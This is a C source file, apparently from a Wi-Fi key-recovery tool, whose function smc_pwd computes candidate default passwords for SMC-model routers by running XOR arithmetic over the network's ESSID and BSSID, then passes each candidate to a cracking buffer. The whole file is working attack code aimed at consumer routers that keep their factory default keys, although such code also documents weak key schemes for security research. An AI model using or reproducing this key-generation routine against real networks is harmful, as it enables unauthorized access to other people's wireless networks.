/*********************************************************************************
 * Copyright (c) 2012, Chema Garcia                                              *
 * All rights reserved.                                                          *
 *                                                                               *
 * Redistribution and use in source and binary forms, with or                    *
 * without modification, are permitted provided that the following               *
 * conditions are met:                                                           *
 *                                                                               *
 *    * Redistributions of source code must retain the above                     *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer.                                                              *
 *                                                                               *
 *    * Redistributions in binary form must reproduce the above                  *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer in the documentation and/or other materials provided          *
 *      with the distribution.                                                   *
 *                                                                               *
 *    * Neither the name of the SafetyBits nor the names of its contributors may *
 *      be used to endorse or promote products derived from this software        *
 *      without specific prior written permission.                               *
 *                                                                               *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"   *
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE     *
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE    *
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE     *
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR           *
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF          *
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS      *
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN       *
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)       *
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE    *
 * POSSIBILITY OF SUCH DAMAGE.                                                   *
 *********************************************************************************/

#include <string.h>
#include <ctype.h>

#include "includes/algorithms.h"
#include "algorithms/smc.h"

//@todo Brute-force 6 digits from ESSID

void smc_pwd ( struct crackdata *crack , unsigned int pattern )
{
    unsigned int    hbssid[12];
    unsigned int    hssid[6];
    short unsigned int    K1 = 0;
    short unsigned int    K2 = 0;
    unsigned int    s = 5;
    unsigned int    X[3], Y[3], Z[3], W[4];
    char            aux[5];
    char            passwd[PASSWD_LEN];
    register int    i;
    unsigned char   *tmp;
    char            *p = 0;

    if ( pattern != SMC_MODEL_GENERIC )
        return;

    switch ( toupper ( crack->net->essid[1] ) )
    {
    case 'L': //WLAN
    case 'I': //WIFI
        p = ( char* ) &crack->net->essid[4];
        break;

    case 'A': //JAZZTEL
        p = ( char* ) &crack->net->essid[5];
        break;

    default:
        break;
    }

    if ( ! p )
        return;

    memset ( hbssid, 0, sizeof ( hbssid ) );
    memset ( hssid, 0, sizeof ( hssid ) );

    sscanf ( p , "%01x%01x%01x%01x%01x%01x" , &hssid[0], &hssid[1], &hssid[2], &hssid[3], &hssid[4], &hssid[5] );
    sscanf ( crack->net->bssid, "%01x%01x:%01x%01x:%01x%01x:%01x%01x:%01x%01x:%01x%01x" , &hbssid[0], &hbssid[1], &hbssid[2], &hbssid[3], &hbssid[4], &hbssid[5], &hbssid[6], &hbssid[7], &hbssid[8], &hbssid[9], &hbssid[10], &hbssid[11] );

    /* obtenemos K2 */
    memset ( aux , 0 , sizeof ( aux ) );
    snprintf ( aux , sizeof ( aux ) , "%01x" , ( hbssid[8] + hbssid[9] + hssid[4] + hssid[5] ) & 0x0F );
    sscanf ( aux , "%hx" , &K2 );

    for ( s = 0 ; s <= 9 && !crack->net->pwd.checked  ; s++ )
    {
        memset ( passwd , 0 , sizeof ( passwd ) );

        /* obtenemos K1 para s = 3 */
        memset ( aux , 0 , sizeof ( aux ) );
        snprintf ( aux , sizeof ( aux ) , "%01x" , ( s + hbssid[10] + hbssid[11] + hssid[3] ) & 0x0F );
        sscanf ( aux , "%hx" , &K1 );

        /* obtenemos X */
        memset ( X , 0 , sizeof ( X ) );
        X[0] = K1 ^ hssid[5];
        X[1] = K1 ^ hssid[4];
        X[2] = K1 ^ hssid[3];

        /* obtenemos Y */
        memset ( Y , 0 , sizeof ( Y ) );
        Y[0] = K2 ^ hbssid[9];
        Y[1] = K2 ^ hbssid[10];
        Y[2] = K2 ^ hbssid[11];

        /* obtenemos Z */
        memset ( Z , 0 , sizeof ( Z ) );
        Z[0] = hbssid[10] ^ hssid[5];
        Z[1] = hbssid[11] ^ hssid[4];
        Z[2] = K1 ^ K2;

        /* obtenemos W */
        memset ( W , 0 , sizeof ( W ) );
        W[0] = X[0] ^ Z[1];
        W[1] = Y[1] ^ Y[2];
        W[2] = Y[0] ^ X[2];
        W[3] = Z[2] ^ X[1];

        /* ordenamos para obtener la clave */
        snprintf ( passwd , sizeof ( passwd ) , "%hx%hx%hx%hx%hx%hx%hx%hx%hx%hx%hx%hx%hx" , W[3] , X[0] , Y[0] , Z[0] , W[0] , X[1] , Y[1] , Z[1] , W[1] , X[2] , Y[2] , Z[2] , W[2] );

        for ( i = 0 ; i < strlen ( passwd ) ; i++ )
            passwd[i] = toupper ( passwd[i] );

        tmp = (unsigned char*) strdup ( (char*) passwd );
        cbuffer_write(crack->buffer,(void*)tmp);
    }
}
